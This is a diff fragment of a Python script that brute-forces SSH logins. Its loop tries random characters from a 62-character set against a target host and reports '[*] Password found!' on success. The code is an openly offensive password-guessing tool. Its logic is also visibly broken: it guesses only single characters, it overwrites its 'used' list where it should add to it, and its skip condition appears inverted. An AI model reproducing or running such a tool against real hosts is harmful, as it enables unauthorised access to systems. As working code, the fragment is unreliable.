@@ -51,51 +51,29 @@ def ssh_connect(password, code = 0):
 	ssh.close()
 	return(code)
 
-input_file = open(input_file)
 print("")
-n = 0
 while True:
 	no = randint(0, 61)
-	if n < 62:
-		passguess = chars[no]
-		if passguess not in used:
-			continue
-		else:
-			n += 1
-			used = [passguess]
+	password = chars[no]
+	if password not in used:
+		try:
+			response = ssh_connect(password)
+
+			if response == 0:
+				print("[*] Password found! '%s'" % (password))
+				sys.exit(0)
+				break
+			elif response == 1:
+				print("'%s' not correct" % (password))
+				time.sleep(0.3)
+			elif response == 2:
+				print("[-] Connection could not be made (host down?)")
+				break
+		except Exception as e:
+			print(e)
 			pass
-	try:
-		response = ssh_connect(password)
 
-		if response == 0:
-			print("[*] Password found! '%s'" % (password))
-			sys.exit(0)
-			break
-		elif response == 1:
-			print("'%s' not correct" % (password))
-			time.sleep(0.3)
-		elif response == 2:
-			print("[-] Connection could not be made (host down?)")
-			break
-	except Exception as e:
-		print(e)
+	else:
+		used = [password]
 		pass
-input_file.close()
-
-n = 0
-while True:
-
-	try:
-		response = ssh_connect(password)
-
-		if response == 0:
-			print("[*] Password found! '%s'" % (password))
-			sys.exit(0)
-		elif response == 1:
-			print("'%s' not correct" % (password))
-			time.sleep(0.3)
-		elif response == 2:
-			print("[-] Connection could not be made (host down?)")
-	except Exception as e:
-		print(e)
-		pass
+	
